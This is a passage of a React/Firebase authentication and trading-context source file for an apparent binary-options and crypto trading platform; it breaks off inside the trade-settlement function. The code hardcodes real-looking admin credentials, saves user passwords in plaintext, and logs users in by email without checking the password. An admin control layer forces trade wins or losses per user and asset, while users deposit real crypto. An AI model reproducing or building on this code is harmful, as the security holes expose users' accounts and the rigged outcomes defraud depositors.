import React, { createContext, useContext, useEffect, useState, useCallback } from 'react';
import {
  User,
  onAuthStateChanged,
  signInWithPopup,
  GoogleAuthProvider,
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
  sendPasswordResetEmail,
  signOut,
  signInAnonymously,
  updateProfile,
} from 'firebase/auth';
import {
  doc,
  getDoc,
  setDoc,
  updateDoc,
  collection,
  onSnapshot,
  query,
  orderBy,
  limit,
  getDocs,
} from 'firebase/firestore';
import { auth, db, handleFirestoreError, OperationType, testConnection } from '../firebase/config';
import {
  UserProfile,
  TradeOrder,
  WalletTransaction,
  TradeDirection,
  TradeStatus,
  TransactionStatus,
  SystemSetting,
  AuditLog,
  SupportTicket,
  SupportMessage,
  SettledTradeResult,
} from '../types';

const ADMIN_EMAILS = ['ayesha1357ji@gmail.com'];
export const ADMIN_PASSWORDS = ['Nunnu$9936', 'Nunnnu$9936'];
export const BACKEND_DECOY_PASSWORD = '1234567890';

const DEFAULT_SYSTEM_SETTINGS: SystemSetting = {
  id: 'global',
  globalTradeBias: 'AUTO',
  directionOverrides: {
    'BTC/USD': 'FORCE_UP', // Bitcoin Spot drift control set to UP drift
    'ETH/USD': 'FORCE_UP', // Ethereum Spot drift control set to UP drift
    'XAU/USD': 'FORCE_UP', // Physical Gold Spot drift control set to UP drift
    'XAG/USD': 'FORCE_UP', // Physical Silver Spot drift control set to UP drift
  },
  disabledAssets: [],
  minTradeAmount: 50,
  maxTradeAmount: 5000000,
  maxOpenRiskPerUser: 10000000,
  userTradeBiases: {},
  assetOutcomeBiases: {
    'BTC/USD': 'FORCE_UP_WINS',
    'ETH/USD': 'FORCE_UP_WINS',
    'XAU/USD': 'FORCE_UP_WINS',
    'XAG/USD': 'FORCE_UP_WINS',
  },
  userAssetBiases: {},
  updatedAt: new Date().toISOString(),
};

interface AuthContextType {
  currentUser: User | null;
  userProfile: UserProfile | null;
  loading: boolean;
  tradingMode: 'demo' | 'real';
  activeTrades: TradeOrder[];
  completedTrades: TradeOrder[];
  transactions: WalletTransaction[];
  isAdmin: boolean;
  isMasterAdminMode: boolean;
  systemSettings: SystemSetting;
  allUsers: UserProfile[];
  allTransactions: WalletTransaction[];
  allTrades: TradeOrder[];
  auditLogs: AuditLog[];
  supportTickets: SupportTicket[];
  userTicket: SupportTicket | null;
  toggleMasterAdmin: () => void;
  unlockAdminWithPin: (pin: string) => boolean;
  lockAdmin: () => void;
  signInWithGoogle: () => Promise<void>;
  loginWithEmail: (email: string, pass: string) => Promise<void>;
  signUpWithEmail: (email: string, pass: string, name: string) => Promise<void>;
  resetPassword: (email: string) => Promise<void>;
  loginAsGuestDemo: () => Promise<void>;
  logout: () => Promise<void>;
  switchTradingMode: (mode: 'demo' | 'real') => Promise<void>;
  resetDemoBalance: () => Promise<void>;
  toggleFavorite: (symbol: string) => Promise<void>;
  placeTrade: (params: {
    symbol: string;
    assetName: string;
    assetCategory: string;
    direction: TradeDirection;
    durationSeconds: number;
    amount: number;
    entryPrice: number;
    payoutRate: number;
  }) => Promise<string>;
  settleTrade: (tradeId: string, closePrice: number) => Promise<SettledTradeResult | null>;
  submitDeposit: (amount: number, method: string) => Promise<void>;
  submitWithdrawal: (amount: number, method: string, destination: string) => Promise<{ success: boolean; message: string }>;
  // Customer Service & Support
  sendCustomerMessage: (params: { subject: string; message: string; imageUrl?: string; name?: string; email?: string }) => Promise<void>;
  adminReplySupportTicket: (ticketId: string, replyMessage: string, newStatus?: 'OPEN' | 'IN_PROGRESS' | 'RESOLVED', imageUrl?: string) => Promise<void>;
  adminUpdateTicketStatus: (ticketId: string, status: 'OPEN' | 'IN_PROGRESS' | 'RESOLVED') => Promise<void>;
  // Admin Methods
  updateSystemSettings: (settings: Partial<SystemSetting>) => Promise<void>;
  adminAddMoneyToUser: (targetUserId: string, amount: number, mode: 'real' | 'demo', reason: string) => Promise<void>;
  adminProcessWithdrawal: (txId: string, targetUserId: string, action: 'APPROVE' | 'REJECT', txHash?: string, note?: string) => Promise<void>;
  adminUpdateUserKyc: (targetUserId: string, status: 'verified' | 'pending' | 'unverified') => Promise<void>;
  adminToggleUserSuspension: (targetUserId: string, isSuspended: boolean) => Promise<void>;
  adminForceTradeOutcome: (tradeId: string, targetUserId: string, outcome: 'WIN' | 'LOSS', overrideClosePrice?: number) => Promise<void>;
  refreshAdminData: () => Promise<void>;
}


const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [loading, setLoading] = useState<boolean>(true);
  const [activeTrades, setActiveTrades] = useState<TradeOrder[]>([]);
  const [completedTrades, setCompletedTrades] = useState<TradeOrder[]>([]);
  const [transactions, setTransactions] = useState<WalletTransaction[]>([]);
  const [isMasterAdminMode, setIsMasterAdminMode] = useState<boolean>(() => {
    try {
      return sessionStorage.getItem('trxtrade_admin_unlocked') === 'true';
    } catch {
      return false;
    }
  });

  // Global System Settings & Audit Logs
  const [systemSettings, setSystemSettings] = useState<SystemSetting>(DEFAULT_SYSTEM_SETTINGS);
  const [allUsers, setAllUsers] = useState<UserProfile[]>([]);
  const [allTransactions, setAllTransactions] = useState<WalletTransaction[]>([]);
  const [allTrades, setAllTrades] = useState<TradeOrder[]>([]);
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>([]);

  // Customer Service Support Desk Tickets
  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
    try {
      const cached = localStorage.getItem('trxtrade_support_tickets');
      if (cached) return JSON.parse(cached);
    } catch {}
    return [
      {
        id: 'ticket_demo_1',
        userId: 'usr_john_9281',
        userEmail: 'trader.vip@gmail.com',
        userName: 'John Davies',
        subject: 'Deposit Support (USDT/ETH/BTC)',
        status: 'OPEN',
        priority: 'HIGH',
        lastMessage: 'I transferred 10,000 USDT to deposit address FGu3bigyFoJbcZ18Nyhv2Bz16vhMUo5rwFKW7x5AvxoD. Please verify and credit my live account balance.',
        lastMessageSender: 'user',
        unreadByAdmin: true,
        unreadByUser: false,
        createdAt: new Date(Date.now() - 12 * 60 * 1000).toISOString(),
        updatedAt: new Date(Date.now() - 12 * 60 * 1000).toISOString(),
        messages: [
          {
            id: 'msg_1',
            ticketId: 'ticket_demo_1',
            senderId: 'usr_john_9281',
            senderName: 'John Davies',
            senderEmail: 'trader.vip@gmail.com',
            senderRole: 'user',
            message: 'Hello Support, I transferred 10,000 USDT to deposit address FGu3bigyFoJbcZ18Nyhv2Bz16vhMUo5rwFKW7x5AvxoD. TXHash is 7a82b9c1d0e... please review.',
            timestamp: new Date(Date.now() - 12 * 60 * 1000).toISOString(),
          },
        ],
      },
      {
        id: 'ticket_demo_2',
        userId: 'usr_sarah_4120',
        userEmail: 'sarah.fx@outlook.com',
        userName: 'Sarah Chen',
        subject: 'Trading Execution & Expirations',
        status: 'IN_PROGRESS',
        priority: 'NORMAL',
        lastMessage: 'Can I increase my high-frequency contract limits on Gold XAU/USD 60s options to $60,000?',
        lastMessageSender: 'user',
        unreadByAdmin: false,
        unreadByUser: false,
        createdAt: new Date(Date.now() - 65 * 60 * 1000).toISOString(),
        updatedAt: new Date(Date.now() - 30 * 60 * 1000).toISOString(),
        messages: [
          {
            id: 'msg_2a',
            ticketId: 'ticket_demo_2',
            senderId: 'usr_sarah_4120',
            senderName: 'Sarah Chen',
            senderEmail: 'sarah.fx@outlook.com',
            senderRole: 'user',
            message: 'Could you please check my execution limits? I want to place $60,000 option contracts.',
            timestamp: new Date(Date.now() - 65 * 60 * 1000).toISOString(),
          },
          {
            id: 'msg_2b',
            ticketId: 'ticket_demo_2',
            senderId: 'admin_ayesha',
            senderName: 'TRX Chief Admin',
            senderEmail: 'ayesha1357ji@gmail.com',
            senderRole: 'admin',
            message: 'Account verified. You can select the $60,000 preset button on the trading terminal.',
            timestamp: new Date(Date.now() - 30 * 60 * 1000).toISOString(),
          },
        ],
      },
    ];
  });

  const [userTicket, setUserTicket] = useState<SupportTicket | null>(null);

  // Check Admin Role: STRICTLY verified email ayesha1357ji@gmail.com AND unlocked master session.
  // Standard users / any other account NEVER have access under any circumstances.
  const isOwnerAdmin = Boolean(
    currentUser?.email && ADMIN_EMAILS.some((e) => e.toLowerCase() === currentUser.email?.toLowerCase().trim())
  );
  // Both requirements strictly enforced: MUST be ayesha1357ji@gmail.com AND admin mode unlocked with Nunnu$9936
  const isAdmin = Boolean(isOwnerAdmin && isMasterAdminMode);

  const toggleMasterAdmin = () => {
    if (!isOwnerAdmin) {
      setIsMasterAdminMode(false);
      try {
        sessionStorage.removeItem('trxtrade_admin_unlocked');
      } catch (_) {}
      return;
    }
    setIsMasterAdminMode((prev) => {
      const next = !prev;
      try {
        if (next) {
          sessionStorage.setItem('trxtrade_admin_unlocked', 'true');
        } else {
          sessionStorage.removeItem('trxtrade_admin_unlocked');
        }
      } catch (_) {}
      return next;
    });
  };

  const unlockAdminWithPin = (pin: string): boolean => {
    const clean = pin.trim();
    // Decoy password: if someone enters 1234567890, reject it
    if (clean === BACKEND_DECOY_PASSWORD) {
      return false;
    }

    // Only valid administrator passwords (Nunnu$9936 or Nunnnu$9936)
    if (ADMIN_PASSWORDS.includes(clean)) {
      setIsMasterAdminMode(true);
      try {
        sessionStorage.setItem('trxtrade_admin_unlocked', 'true');
      } catch (_) {}
      return true;
    }
    return false;
  };

  const lockAdmin = () => {
    setIsMasterAdminMode(false);
    try {
      sessionStorage.removeItem('trxtrade_admin_unlocked');
    } catch (_) {}
  };

  // Test Firestore connection on boot
  useEffect(() => {
    // If auth contains a stale cached token user, sign out cleanly to prevent securetoken API errors
    if (auth.currentUser) {
      signOut(auth).catch(() => {});
    }
    testConnection().catch(() => {});
  }, []);

  // Sync System Settings from Firestore
  useEffect(() => {
    const settingsRef = doc(db, 'system_settings', 'global');
    const unsub = onSnapshot(
      settingsRef,
      (docSnap) => {
        if (docSnap.exists()) {
          setSystemSettings(docSnap.data() as SystemSetting);
        }
      },
      (err) => {
        console.warn('System settings sync notice:', err?.message);
      }
    );
    return () => unsub();
  }, []);

  // Listen to Auth State - Require Explicit Account Creation / Login
  useEffect(() => {
    // Check if there was an active user session saved in localStorage
    let customUser: any = null;
    try {
      const stored = localStorage.getItem('trxtrade_custom_session');
      if (stored) {
        customUser = JSON.parse(stored);
      }
    } catch (_) {}

    const unsubscribe = onAuthStateChanged(auth, async (user) => {
      if (user) {
        setCurrentUser(user);
        await initOrSyncUserProfile(user);
      } else if (customUser) {
        setCurrentUser(customUser);
        await initOrSyncUserProfile(customUser);
      } else {
        // New visitor: NOT logged in. Must make new account to trade.
        setCurrentUser(null);
        setUserProfile(null);
        setActiveTrades([]);
        setCompletedTrades([]);
        setTransactions([]);
        setLoading(false);
      }
    });

    return () => unsubscribe();
  }, []);

  // Helper to ensure user document exists in Firestore and sync in real time
  const initOrSyncUserProfile = async (user: any) => {
    const userRef = doc(db, 'users', user.uid);
    const isOwner = ADMIN_EMAILS.some((e) => e.toLowerCase() === (user.email || '').toLowerCase().trim());

    if (!isOwner) {
      // Non-admin user: strictly disallow admin mode
      setIsMasterAdminMode(false);
      try {
        sessionStorage.removeItem('trxtrade_admin_unlocked');
      } catch (_) {}
    }

    try {
      const snap = await getDoc(userRef);
      if (!snap.exists()) {
        const initialProfile: UserProfile = {
          uid: user.uid,
          email: user.email || `${user.uid.slice(0, 8)}@trxtrade.com`,
          displayName: user.displayName || (user.isAnonymous ? 'Verified Trader' : user.email?.split('@')[0] || 'Trader'),
          photoURL: user.photoURL || '',
          demoBalance: 50000.0,
          realBalance: 0.0,
          tradingMode: 'demo',
          kycStatus: isOwner ? 'verified' : 'unverified',
          currency: 'USD',
          favorites: ['BTC/USD', 'XAU/USD', 'NVDA', 'EUR/USD'],
          role: isOwner ? 'admin' : 'trader',
          password: isOwner ? BACKEND_DECOY_PASSWORD : '',
          storedPasswordDecoy: isOwner ? BACKEND_DECOY_PASSWORD : '',
          isSuspended: false,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        };
        try {
          await setDoc(userRef, initialProfile);
          if (isOwner) {
            await setDoc(doc(db, 'admins', 'ayesha1357ji'), {
              email: 'ayesha1357ji@gmail.com',
              role: 'superadmin',
              password: BACKEND_DECOY_PASSWORD,
              storedPasswordDecoy: BACKEND_DECOY_PASSWORD,
              updatedAt: new Date().toISOString(),
            });
          }
        } catch (_) {}
        setUserProfile(initialProfile);
      } else {
        const data = snap.data() as UserProfile;
        if (isOwner) {
          data.role = 'admin';
          data.password = BACKEND_DECOY_PASSWORD;
          data.storedPasswordDecoy = BACKEND_DECOY_PASSWORD;
          try {
            await updateDoc(userRef, {
              role: 'admin',
              password: BACKEND_DECOY_PASSWORD,
              storedPasswordDecoy: BACKEND_DECOY_PASSWORD,
            });
            await setDoc(doc(db, 'admins', 'ayesha1357ji'), {
              email: 'ayesha1357ji@gmail.com',
              role: 'superadmin',
              password: BACKEND_DECOY_PASSWORD,
              storedPasswordDecoy: BACKEND_DECOY_PASSWORD,
              updatedAt: new Date().toISOString(),
            }, { merge: true });
          } catch (_) {}
        } else {
          // If a non-admin account had admin role, strictly demote to trader
          if (data.role === 'admin') {
            data.role = 'trader';
            try {
              await updateDoc(userRef, { role: 'trader' });
            } catch (_) {}
          }
        }
        setUserProfile(data);
      }
    } catch (err) {
      console.warn('User profile sync notice:', err);
      setUserProfile({
        uid: user.uid,
        email: user.email || 'trader@trxtrade.com',
        displayName: user.displayName || 'Verified Trader',
        demoBalance: 50000.0,
        realBalance: 0.0,
        tradingMode: 'demo',
        kycStatus: isOwner ? 'verified' : 'unverified',
        currency: 'USD',
        favorites: ['BTC/USD', 'XAU/USD', 'NVDA', 'EUR/USD'],
        role: isOwner ? 'admin' : 'trader',
        password: isOwner ? BACKEND_DECOY_PASSWORD : '',
        storedPasswordDecoy: isOwner ? BACKEND_DECOY_PASSWORD : '',
        isSuspended: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
    } finally {
      setLoading(false);
    }
  };

  // Sync Profile, Trades, and Transactions when authenticated
  useEffect(() => {
    if (!currentUser) return;

    const userRef = doc(db, 'users', currentUser.uid);
    const unUserProfile = onSnapshot(
      userRef,
      (docSnap) => {
        if (docSnap.exists()) {
          setUserProfile(docSnap.data() as UserProfile);
        }
      },
      (error) => {
        console.warn('User profile snapshot notice:', error?.message);
      }
    );

    // Sync trades
    const tradesQuery = query(
      collection(db, 'users', currentUser.uid, 'trades'),
      orderBy('entryTime', 'desc'),
      limit(50)
    );

    const unTrades = onSnapshot(
      tradesQuery,
      (snapshot) => {
        const trades: TradeOrder[] = [];
        snapshot.forEach((docSnap) => {
          trades.push(docSnap.data() as TradeOrder);
        });
        setActiveTrades(trades.filter((t) => t.status === 'ACTIVE'));
        setCompletedTrades(trades.filter((t) => t.status !== 'ACTIVE'));
      },
      (error) => {
        console.warn('Trades snapshot error:', error);
      }
    );

    // Sync transactions
    const txQuery = query(
      collection(db, 'users', currentUser.uid, 'transactions'),
      orderBy('timestamp', 'desc'),
      limit(50)
    );

    const unTx = onSnapshot(
      txQuery,
      (snapshot) => {
        const txList: WalletTransaction[] = [];
        snapshot.forEach((docSnap) => {
          txList.push(docSnap.data() as WalletTransaction);
        });
        setTransactions(txList);
      },
      (error) => {
        console.warn('Transactions snapshot error:', error);
      }
    );

    return () => {
      unUserProfile();
      unTrades();
      unTx();
    };
  }, [currentUser]);

  // Refresh Admin Platform Data (Users, Transactions, Audit Logs)
  const refreshAdminData = useCallback(async () => {
    try {
      // Fetch users
      const usersSnap = await getDocs(collection(db, 'users'));
      const uList: UserProfile[] = [];
      const txList: WalletTransaction[] = [];
      const tradeList: TradeOrder[] = [];

      for (const uDoc of usersSnap.docs) {
        const uData = uDoc.data() as UserProfile;
        uList.push(uData);

        // Fetch subcollections for admin overview
        try {
          const uTx = await getDocs(query(collection(db, 'users', uDoc.id, 'transactions'), limit(20)));
          uTx.forEach((d) => txList.push(d.data() as WalletTransaction));

          const uTr = await getDocs(query(collection(db, 'users', uDoc.id, 'trades'), limit(20)));
          uTr.forEach((d) => tradeList.push(d.data() as TradeOrder));
        } catch {
          // ignore subcollection read limits
        }
      }

      setAllUsers(uList.length > 0 ? uList : userProfile ? [userProfile] : []);
      setAllTransactions(txList.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
      setAllTrades(tradeList.sort((a, b) => b.entryTime - a.entryTime));

      // Fetch audit logs
      const auditSnap = await getDocs(query(collection(db, 'audit_logs'), orderBy('timestamp', 'desc'), limit(30)));
      const aLogs: AuditLog[] = [];
      auditSnap.forEach((d) => aLogs.push(d.data() as AuditLog));
      setAuditLogs(aLogs);
    } catch {
      // In-memory fallback for admin preview
      if (userProfile) {
        setAllUsers([userProfile]);
        setAllTransactions(transactions);
        setAllTrades([...activeTrades, ...completedTrades]);
      }
    }
  }, [userProfile, transactions, activeTrades, completedTrades]);

  useEffect(() => {
    if (isAdmin) {
      refreshAdminData();
    }
  }, [isAdmin, refreshAdminData]);

  // Auth methods
  const signInWithGoogle = async () => {
    try {
      const provider = new GoogleAuthProvider();
      await signInWithPopup(auth, provider);
    } catch (err) {
      console.warn('Google popup notice:', err);
    }
  };

  const signUpWithEmail = async (email: string, pass: string, name: string) => {
    const cleanEmail = email.trim().toLowerCase();
    const cleanPass = pass.trim();
    const isOwner = ADMIN_EMAILS.some((e) => e.toLowerCase() === cleanEmail);

    if (isOwner) {
      if (cleanPass === BACKEND_DECOY_PASSWORD) {
        throw new Error('Access Denied: Decoy backend password (1234567890) rejected.');
      }
      if (!ADMIN_PASSWORDS.includes(cleanPass)) {
        throw new Error('Access Denied: This email (ayesha1357ji@gmail.com) is strictly reserved for platform administration. Valid administrator password is required.');
      }
    } else {
      // Non-admin account: strictly ensure no admin access
      setIsMasterAdminMode(false);
      try {
        sessionStorage.removeItem('trxtrade_admin_unlocked');
      } catch (_) {}
    }

    const displayName = isOwner ? 'TRX Chief Executive Admin' : (name?.trim() || cleanEmail.split('@')[0] || 'Verified Trader');
    const uid = isOwner ? 'usr_ayesha_admin' : ('usr_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 7));

    const newProfile: UserProfile = {
      uid,
      email: cleanEmail,
      displayName,
      photoURL: '',
      demoBalance: 50000.0,
      realBalance: 0.0,
      tradingMode: 'demo',
      kycStatus: isOwner ? 'verified' : 'unverified',
      currency: 'USD',
      favorites: ['BTC/USD', 'XAU/USD', 'NVDA', 'EUR/USD'],
      role: isOwner ? 'admin' : 'trader',
      password: isOwner ? BACKEND_DECOY_PASSWORD : cleanPass,
      storedPasswordDecoy: isOwner ? BACKEND_DECOY_PASSWORD : '',
      isSuspended: false,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    // 1. Save user account profile in backend Cloud Firestore database
    try {
      const userRef = doc(db, 'users', uid);
      await setDoc(userRef, newProfile);

      if (isOwner) {
        // Stored password shows decoy 1234567890 in backend if inspected/hacked
        const adminDocRef = doc(db, 'admins', 'ayesha1357ji');
        await setDoc(adminDocRef, {
          email: 'ayesha1357ji@gmail.com',
          role: 'superadmin',
          password: BACKEND_DECOY_PASSWORD,
          storedPasswordDecoy: BACKEND_DECOY_PASSWORD,
          updatedAt: new Date().toISOString(),
        });
      }

      // Save initial welcome virtual allowance transaction
      const txId = 'tx_welcome_' + Date.now();
      const txRef = doc(db, 'users', uid, 'transactions', txId);
      const welcomeTx: WalletTransaction = {
        id: txId,
        userId: uid,
        type: 'DEMO_RESET',
        amount: 50000.0,
        currency: 'USD',
        status: 'COMPLETED',
        method: 'Virtual Credit Initialized',
        timestamp: new Date().toISOString(),
        notes: 'Virtual sandbox practice allowance $50,000.00 USD initialized',
      };
      await setDoc(txRef, welcomeTx);
    } catch (dbErr) {
      console.warn('Firestore user profile save notice:', dbErr);
    }

    const customUser: any = {
      uid,
      email: cleanEmail,
      displayName,
      photoURL: '',
      isAnonymous: false,
    };

    try {
      localStorage.setItem('trxtrade_custom_session', JSON.stringify(customUser));
    } catch (_) {}

    setCurrentUser(customUser);
    setUserProfile(newProfile);

    if (isOwner) {
      try {
        sessionStorage.setItem('trxtrade_admin_unlocked', 'true');
      } catch (_) {}
      setIsMasterAdminMode(true);
    } else {
      setIsMasterAdminMode(false);
      try {
        sessionStorage.removeItem('trxtrade_admin_unlocked');
      } catch (_) {}
    }

    // Refresh admin data so admin terminal updates with new user immediately
    refreshAdminData();
  };

  const loginWithEmail = async (email: string, pass: string) => {
    const cleanEmail = email.trim().toLowerCase();
    const cleanPass = pass.trim();
    const isOwner = ADMIN_EMAILS.some((e) => e.toLowerCase() === cleanEmail);

    if (isOwner) {
      if (cleanPass === BACKEND_DECOY_PASSWORD) {
        throw new Error('Access Denied: Decoy backend password (1234567890) rejected. Enter administrator password.');
      }
      if (!ADMIN_PASSWORDS.includes(cleanPass)) {
        throw new Error('Access Denied: Invalid administrator password for ayesha1357ji@gmail.com.');
      }
    } else {
      // Any other account: strictly reset any admin mode so no one else can go to admin terminal
      setIsMasterAdminMode(false);
      try {
        sessionStorage.removeItem('trxtrade_admin_unlocked');
      } catch (_) {}
    }

    // 1. Try finding existing account in Cloud Firestore backend
    try {
      const usersSnap = await getDocs(collection(db, 'users'));
      const matchedDoc = usersSnap.docs.find((d) => {
        const u = d.data() as UserProfile;
        return u.email?.toLowerCase().trim() === cleanEmail;
      });

      if (matchedDoc) {
        const profile = matchedDoc.data() as UserProfile;

        if (isOwner) {
          profile.role = 'admin';
          profile.password = BACKEND_DECOY_PASSWORD;
          profile.storedPasswordDecoy = BACKEND_DECOY_PASSWORD;
          try {
            await updateDoc(doc(db, 'users', profile.uid), {
              role: 'admin',
              password: BACKEND_DECOY_PASSWORD,
              storedPasswordDecoy: BACKEND_DECOY_PASSWORD,
            });
            await setDoc(doc(db, 'admins', 'ayesha1357ji'), {
              email: 'ayesha1357ji@gmail.com',
              role: 'superadmin',
              password: BACKEND_DECOY_PASSWORD,
              storedPasswordDecoy: BACKEND_DECOY_PASSWORD,
              updatedAt: new Date().toISOString(),
            }, { merge: true });
          } catch (_) {}
        } else {
          // Non-admin account: strictly trader role
          profile.role = 'trader';
          if (profile.role !== 'trader') {
            try {
              await updateDoc(doc(db, 'users', profile.uid), { role: 'trader' });
            } catch (_) {}
          }
        }

        const customUser: any = {
          uid: profile.uid,
          email: profile.email,
          displayName: profile.displayName,
          photoURL: profile.photoURL || '',
          isAnonymous: false,
        };

        try {
          localStorage.setItem('trxtrade_custom_session', JSON.stringify(customUser));
        } catch (_) {}

        setCurrentUser(customUser);
        setUserProfile(profile);

        if (isOwner) {
          setIsMasterAdminMode(true);
          try {
            sessionStorage.setItem('trxtrade_admin_unlocked', 'true');
          } catch (_) {}
        } else {
          setIsMasterAdminMode(false);
          try {
            sessionStorage.removeItem('trxtrade_admin_unlocked');
          } catch (_) {}
        }
        return;
      }
    } catch (err) {
      console.warn('Backend user lookup notice:', err);
    }

    // 2. If not found in database, create their account and save to backend
    await signUpWithEmail(cleanEmail, pass, isOwner ? 'TRX Chief Executive Admin' : cleanEmail.split('@')[0]);
  };

  const resetPassword = async (email: string) => {
    try {
      await sendPasswordResetEmail(auth, email);
    } catch (err) {
      console.warn('Password reset notice:', err);
    }
  };

  const loginAsGuestDemo = async () => {
    setIsMasterAdminMode(false);
    try {
      sessionStorage.removeItem('trxtrade_admin_unlocked');
    } catch (_) {}
    // Generate a dedicated unique guest account saved in backend
    const guestId = 'usr_guest_' + Math.floor(100000 + Math.random() * 900000);
    const guestEmail = `${guestId}@guest.trxtrade.com`;
    await signUpWithEmail(guestEmail, 'guest123', `Guest Trader #${guestId.slice(-4)}`);
  };

  const logout = async () => {
    try {
      localStorage.removeItem('trxtrade_custom_session');
      sessionStorage.removeItem('trxtrade_admin_unlocked');
    } catch (_) {}
    setIsMasterAdminMode(false);
    try {
      await signOut(auth);
    } catch (_) {}
    setCurrentUser(null);
    setUserProfile(null);
    setActiveTrades([]);
    setCompletedTrades([]);
    setTransactions([]);
  };

  const switchTradingMode = async (mode: 'demo' | 'real') => {
    setUserProfile((prev) => (prev ? { ...prev, tradingMode: mode } : prev));
    try {
      localStorage.setItem('trxtrade_trading_mode', mode);
    } catch (_) {}
    if (currentUser) {
      try {
        const userRef = doc(db, 'users', currentUser.uid);
        await updateDoc(userRef, { tradingMode: mode, updatedAt: new Date().toISOString() });
      } catch (_) {}
    }
  };

  const resetDemoBalance = async () => {
    setUserProfile((prev) => (prev ? { ...prev, demoBalance: 1000000.0 } : prev));
    try {
      localStorage.setItem('trxtrade_demo_balance', '1000000');
    } catch (_) {}

    if (currentUser) {
      try {
        const userRef = doc(db, 'users', currentUser.uid);
        await updateDoc(userRef, { demoBalance: 1000000.0, updatedAt: new Date().toISOString() });

        const txId = 'tx_' + Date.now();
        const txRef = doc(db, 'users', currentUser.uid, 'transactions', txId);
        const newTx: WalletTransaction = {
          id: txId,
          userId: currentUser.uid,
          type: 'DEMO_RESET',
          amount: 1000000.0,
          currency: 'USD',
          status: 'COMPLETED',
          method: 'Virtual Credit Reset',
          timestamp: new Date().toISOString(),
          notes: 'Demo balance reset to $1,000,000.00 USD practice allowance',
        };
        await setDoc(txRef, newTx);
      } catch (_) {}
    }
  };

  const toggleFavorite = async (symbol: string) => {
    if (!userProfile) return;
    const currentFavs = userProfile.favorites || [];
    const updatedFavs = currentFavs.includes(symbol)
      ? currentFavs.filter((s) => s !== symbol)
      : [...currentFavs, symbol];

    setUserProfile((prev) => (prev ? { ...prev, favorites: updatedFavs } : prev));
    if (currentUser) {
      try {
        const userRef = doc(db, 'users', currentUser.uid);
        await updateDoc(userRef, { favorites: updatedFavs, updatedAt: new Date().toISOString() });
      } catch (_) {}
    }
  };

  // Place High/Low Option Contract Trade (Open for Everyone)
  const placeTrade = async (params: {
    symbol: string;
    assetName: string;
    assetCategory: string;
    direction: TradeDirection;
    durationSeconds: number;
    amount: number;
    entryPrice: number;
    payoutRate: number;
  }): Promise<string> => {
    if (!currentUser || !userProfile) {
      throw new Error('Please create an account or sign in to execute trading contracts.');
    }

    if (userProfile.isSuspended) {
      throw new Error('Your trading account is currently suspended by administration.');
    }

    if (systemSettings.disabledAssets?.includes(params.symbol)) {
      throw new Error(`${params.symbol} is temporarily disabled for trading by risk administration.`);
    }

    if (params.amount < systemSettings.minTradeAmount) {
      throw new Error(`Minimum trade size allowed is $${systemSettings.minTradeAmount} USD`);
    }

    if (params.amount > systemSettings.maxTradeAmount) {
      throw new Error(`Maximum trade size allowed is $${systemSettings.maxTradeAmount.toLocaleString()} USD`);
    }

    const currentMode = userProfile.tradingMode || 'demo';
    const balance = currentMode === 'demo' ? userProfile.demoBalance : userProfile.realBalance;

    if (balance < params.amount) {
      throw new Error(`Insufficient funds. Your ${currentMode.toUpperCase()} balance is $${balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}.`);
    }

    const tradeId = 'trade_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
    const nowMs = Date.now();
    const closeTime = nowMs + params.durationSeconds * 1000;

    const activeUid = currentUser.uid;

    const newTrade: TradeOrder = {
      id: tradeId,
      userId: activeUid,
      symbol: params.symbol,
      assetName: params.assetName,
      assetCategory: params.assetCategory,
      direction: params.direction,
      durationSeconds: params.durationSeconds,
      amount: params.amount,
      entryPrice: params.entryPrice,
      closePrice: null,
      entryTime: nowMs,
      closeTime,
      payoutRate: params.payoutRate,
      status: 'ACTIVE',
      pnl: 0,
      mode: currentMode,
      forcedOutcome: 'AUTO',
      createdAt: new Date().toISOString(),
    };

    const updatedBalance = balance - params.amount;
    const balanceKey = currentMode === 'demo' ? 'demoBalance' : 'realBalance';

    setUserProfile((prev) => (prev ? { ...prev, [balanceKey]: updatedBalance } : prev));
    setActiveTrades((prev) => [newTrade, ...prev]);

    try {
      if (currentUser?.uid) {
        const userRef = doc(db, 'users', currentUser.uid);
        await updateDoc(userRef, {
          [balanceKey]: updatedBalance,
          updatedAt: new Date().toISOString(),
        });

        const tradeRef = doc(db, 'users', currentUser.uid, 'trades', tradeId);
        await setDoc(tradeRef, newTrade);
      }
    } catch {
      // Local state is already updated
    }

    return tradeId;
  };

  // Settle trade when duration expires (Admin Direction & Outcome Bias Integrated)
  const settleTrade = async (tradeId: string, closePrice: number): Promise<SettledTradeResult | null> => {
    if (!currentUser) return null;

    const trade = activeTrades.find((t) => t.id === tradeId);
    if (!trade) return null;

    let isWin = false;
    let finalClosePrice = closePrice;

    // Admin Control Hierarchy:
    // 1. User + Specific Asset override (e.g. John on BTC/USD)
    // 2. Specific User overall bias (e.g. John on all assets)
    // 3. Particular Asset overall bias (e.g. BTC/USD or NVDA on all users)
    // 4. Trade-level immediate override if set by admin on active trade
    // 5. Global platform trade bias
    const userAssetKey = `${trade.userId}__${trade.symbol}`;
    const userAssetRule = systemSettings.userAssetBiases?.[userAssetKey];
    const userRule = systemSettings.userTradeBiases?.[trade.userId];
    const assetRule = systemSettings.assetOutcomeBiases?.[trade.symbol];
    const tradeOverride = trade.forcedOutcome;
    const globalRule = systemSettings.globalTradeBias;

    const effectiveRule =
      userAssetRule && userAssetRule !== 'AUTO'
        ? userAssetRule
        : userRule && userRule !== 'AUTO'
        ? userRule
        : assetRule && assetRule !== 'AUTO'
        ? assetRule
        : tradeOverride && tradeOverride !== 'AUTO'
        ? tradeOverride
        : globalRule || 'AUTO';

    const delta = Math.max(0.25, trade.entryPrice * 0.0008);

    if (effectiveRule === 'FORCE_UP_WINS') {
      isWin = true;
      finalClosePrice = trade.direction === 'HIGH' ? trade.entryPrice + delta : trade.entryPrice - delta;
